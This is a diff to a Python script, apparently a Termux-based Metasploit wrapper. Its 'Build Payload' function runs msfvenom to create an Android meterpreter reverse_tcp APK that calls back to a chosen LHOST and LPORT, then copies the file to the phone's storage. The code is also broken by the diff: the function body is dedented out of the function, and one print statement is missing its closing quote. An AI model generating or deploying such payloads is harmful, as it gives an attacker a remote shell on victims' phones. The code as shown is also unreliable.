@@ -1,15 +1,22 @@
 import os
 
 def build_payload():
-    lhost = input("LHOST - ")
-    lport = input("LPORT - ")
-    IPORA = input("Payload Name -")
 
-    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {IPORA}"
+lhost = input("LHOST - ")
+lport = input("LPORT - ")
+apk_name = input("Paload Name - ")
+print(" THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
+print(" JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
+print("IN FOLDERS SECTION")
 
-    print(msfvenom_command)
+msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {apk_name}"
 
-    os.system(msfvenom_command)
+print(msfvenom_command)
+
+os.system(msfvenom_command)
+
+os.system(f"mv {apk_name} /storage/emulated/0/")
+
 
 def install_metasploit():
     os.system('''
@@ -199,7 +206,8 @@ while True:
     print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
     print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
     print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
-    print(" By KiNGEX | github.com/KiNGEX1")
+    print(" By KiNGEX | github.com/KiNGEX1
+    print("MADE IN INDIA")
     print("_________________________________")
     print("Options:")
     print("1. Build Payload")
